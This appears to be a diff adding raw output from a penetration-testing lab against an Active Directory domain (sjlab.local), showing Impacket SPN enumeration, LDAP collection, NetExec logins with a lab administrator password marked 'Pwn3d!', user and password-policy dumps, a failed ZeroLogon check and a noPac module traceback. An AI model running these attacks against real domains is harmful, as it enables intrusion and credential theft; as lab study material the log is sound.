@@ -1,0 +1,153 @@
+Impacket v0.12.0.dev1+20240502.235035.cb8467c3 - Copyright 2023 Fortra
+
+ServicePrincipalName                     Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
+---------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
+WS2K19-DC01/SQLService.sjlab.local:6011  SQLService  CN=Group Policy Creator Owners,OU=Group,DC=sjlab,DC=local  2024-05-03 13:24:07.888728  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240502.235035.cb8467c3', 'GetUserSPNs.py')
+
+
+INFO: Found AD domain: sjlab.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (ws2k19-dc01.sjlab.local:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: ws2k19-dc01.sjlab.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 3 computers
+INFO: Connecting to LDAP server: ws2k19-dc01.sjlab.local
+INFO: Found 15 users
+INFO: Found 55 groups
+INFO: Found 4 gpos
+INFO: Found 6 ous
+INFO: Found 22 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: SJ-21317503-W10.sjlab.local
+INFO: Querying computer: SJ-21317503-W7.sjlab.local
+INFO: Querying computer: WS2K19-DC01.sjlab.local
+INFO: Done in 00M 39S
+
+
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+SMB                      192.168.20.12   445    WS2K19-DC01      -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB                      192.168.20.12   445    WS2K19-DC01      Administrator                 2024-04-26 01:58:27 0       Built-in account for administering the computer/domain 
+SMB                      192.168.20.12   445    WS2K19-DC01      Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB                      192.168.20.12   445    WS2K19-DC01      krbtgt                        2024-04-26 02:27:20 0       Key Distribution Center Service Account 
+SMB                      192.168.20.12   445    WS2K19-DC01      lab.user1                     <never>             0        
+SMB                      192.168.20.12   445    WS2K19-DC01      lab.user2                     <never>             0        
+SMB                      192.168.20.12   445    WS2K19-DC01      tester                        2024-05-03 16:50:18 0        
+SMB                      192.168.20.12   445    WS2K19-DC01      hacker                        2024-05-03 16:54:24 0        
+SMB                      192.168.20.12   445    WS2K19-DC01      PeterParker                   <never>             0        
+SMB                      192.168.20.12   445    WS2K19-DC01      brucewayne                    <never>             0        
+SMB                      192.168.20.12   445    WS2K19-DC01      dianaprince                   <never>             0        
+SMB                      192.168.20.12   445    WS2K19-DC01      misconfig                     <never>             0        
+SMB                      192.168.20.12   445    WS2K19-DC01      SQLService                    2024-05-03 05:24:07 0       Password is Password@1 
+SMB                      192.168.20.12   445    WS2K19-DC01      tonystark                     2024-05-03 08:34:34 0        
+SMB                      192.168.20.12   445    WS2K19-DC01      james                         2024-10-10 16:43:16 0        
+
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] Dumping password info for domain: SJLAB
+SMB                      192.168.20.12   445    WS2K19-DC01      Minimum password length: 7
+SMB                      192.168.20.12   445    WS2K19-DC01      Password history length: 24
+SMB                      192.168.20.12   445    WS2K19-DC01      Maximum password age: 41 days 23 hours 53 minutes 
+SMB                      192.168.20.12   445    WS2K19-DC01      
+SMB                      192.168.20.12   445    WS2K19-DC01      Password Complexity Flags: 000001
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Refuse Password Change: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password Store Cleartext: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password Lockout Admins: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password No Clear Change: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password No Anon Change: 0
+SMB                      192.168.20.12   445    WS2K19-DC01         Domain Password Complex: 1
+SMB                      192.168.20.12   445    WS2K19-DC01      
+SMB                      192.168.20.12   445    WS2K19-DC01      Minimum password age: 1 day 4 minutes 
+SMB                      192.168.20.12   445    WS2K19-DC01      Reset Account Lockout Counter: 10 minutes 
+SMB                      192.168.20.12   445    WS2K19-DC01      Locked Account Duration: 10 minutes 
+SMB                      192.168.20.12   445    WS2K19-DC01      Account Lockout Threshold: None
+SMB                      192.168.20.12   445    WS2K19-DC01      Forced Log off Time: Not Set
+
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+ZEROLOGON                192.168.20.12   445    WS2K19-DC01      Attack failed. Target is probably patched.
+
+
+SMB                      192.168.20.12   445    WS2K19-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS2K19-DC01) (domain:sjlab.local) (signing:True) (SMBv1:False)
+SMB                      192.168.20.12   445    WS2K19-DC01      [+] sjlab.local\Administrator:Test@123 (Pwn3d!)
+[12:12:45] ERROR    Exception while calling proto_flow() on target 192.168.20.12: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)                                                         connection.py:129
+                    ╭────────────────────────────────────────────────────────────────────── Traceback (most recent call last) ───────────────────────────────────────────────────────────────────────╮                  
+                    │ /home/sj-21317503/.local/share/pipx/venvs/netexec/lib/python3.11/site-packages/nxc/connection.py:124 in __init__                                                               │                  
+                    │                                                                                                                                                                                │                  
+                    │   121 │   │   │   sleep(value)                                                                                                                                                 │                  
+                    │   122 │   │                                                                                                                                                                    │                  
+                    │   123 │   │   try:                                                                                                                                                             │                  
+                    │ ❱ 124 │   │   │   self.proto_flow()                                                                                                                                            │                  
+                    │   125 │   │   except Exception as e:                                                                                                                                           │                  
+                    │   126 │   │   │   if "ERROR_DEPENDENT_SERVICES_RUNNING" in str(e):                                                                                                             │                  
+                    │   127 │   │   │   │   self.logger.error(f"Exception while calling proto_flow() on target                                                                                       │                  
+                    │       {self.host}: {e}")                                                                                                                                                       │                  
+                    │                                                                                                                                                                                │                  
+                    │ /home/sj-21317503/.local/share/pipx/venvs/netexec/lib/python3.11/site-packages/nxc/connection.py:175 in proto_flow                                                             │                  
+                    │                                                                                                                                                                                │                  
+                    │   172 │   │   │   │   if hasattr(self.args, "module") and self.args.module:                                                                                                    │                  
+                    │   173 │   │   │   │   │   self.load_modules()                                                                                                                                  │                  
+                    │   174 │   │   │   │   │   self.logger.debug("Calling modules")                                                                                                                 │                  
+                    │ ❱ 175 │   │   │   │   │   self.call_modules()                                                                                                                                  │                  
+                    │   176 │   │   │   │   else:                                                                                                                                                    │                  
+                    │   177 │   │   │   │   │   self.logger.debug("Calling command arguments")                                                                                                       │                  
+                    │   178 │   │   │   │   │   self.call_cmd_args()                                                                                                                                 │                  
+                    │                                                                                                                                                                                │                  
+                    │ /home/sj-21317503/.local/share/pipx/venvs/netexec/lib/python3.11/site-packages/nxc/connection.py:229 in call_modules                                                           │                  
+                    │                                                                                                                                                                                │                  
+                    │   226 │   │   │                                                                                                                                                                │                  
+                    │   227 │   │   │   if hasattr(module, "on_login"):                                                                                                                              │                  
+                    │   228 │   │   │   │   self.logger.debug(f"Module {module.name} has on_login method")                                                                                           │                  
+                    │ ❱ 229 │   │   │   │   module.on_login(context, self)                                                                                                                           │                  
+                    │   230 │   │   │                                                                                                                                                                │                  
+                    │   231 │   │   │   if self.admin_privs and hasattr(module, "on_admin_login"):                                                                                                   │                  
+                    │   232 │   │   │   │   self.logger.debug(f"Module {module.name} has on_admin_login method")                                                                                     │                  
+                    │                                                                                                                                                                                │                  
+                    │ /home/sj-21317503/.local/share/pipx/venvs/netexec/lib/python3.11/site-packages/nxc/modules/nopac.py:24 in on_login                                                             │                  
+                    │                                                                                                                                                                                │                  
+                    │   21 │   def on_login(self, context, connection):                                                                                                                              │                  
+                    │   22 │   │   user_name = Principal(connection.username,                                                                                                                        │                  
+                    │      type=constants.PrincipalNameType.NT_PRINCIPAL.value)                                                                                                                      │                  
+                    │   23 │   │   try:                                                                                                                                                              │                  
+                    │ ❱ 24 │   │   │   tgt_with_pac, cipher, old_session_key, session_key = getKerberosTGT(                                                                                          │                  
+                    │   25 │   │   │   │   user_name,                                                                                                                                                │                  
+                    │   26 │   │   │   │   connection.password,                                                                                                                                      │                  
+                    │   27 │   │   │   │   connection.domain,                                                                                                                                        │                  
+                    │                                                                                                                                                                                │                  
+                    │ /home/sj-21317503/.local/share/pipx/venvs/netexec/lib/python3.11/site-packages/impacket/krb5/kerberosv5.py:321 in getKerberosTGT                                               │                  
+                    │                                                                                                                                                                                │                  
+                    │   318 │   │   seq_set_iter(reqBody, 'etype', ( (int(cipher.enctype),)))                                                                                                        │                  
+                    │   319 │   │                                                                                                                                                                    │                  
+                    │   320 │   │   try:                                                                                                                                                             │                  
+                    │ ❱ 321 │   │   │   tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)                                                                                                    │                  
+                    │   322 │   │   except Exception as e:                                                                                                                                           │                  
+                    │   323 │   │   │   if str(e).find('KDC_ERR_ETYPE_NOSUPP') >= 0:                                                                                                                 │                  
+                    │   324 │   │   │   │   if lmhash == b'' and nthash == b'' and (aesKey == b'' or aesKey is                                                                                       │                  
+                    │       None):                                                                                                                                                                   │                  
+                    │                                                                                                                                                                                │                  
+                    │ /home/sj-21317503/.local/share/pipx/venvs/netexec/lib/python3.11/site-packages/impacket/krb5/kerberosv5.py:91 in sendReceive                                                   │                  
+                    │                                                                                                                                                                                │                  
+                    │    88 │   │   except:                                                                                                                                                          │                  
+                    │    89 │   │   │   # Couldn't get server time for some reason                                                                                                                   │                  
+                    │    90 │   │   │   pass                                                                                                                                                         │                  
+                    │ ❱  91 │   │   raise krbError                                                                                                                                                   │                  
+                    │    92 │                                                                                                                                                                        │                  
+                    │    93 │   return r                                                                                                                                                             │                  
+                    │    94                                                                                                                                                                          │                  
+                    ╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯                  
+                    KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)                                                                                                                         
+
+
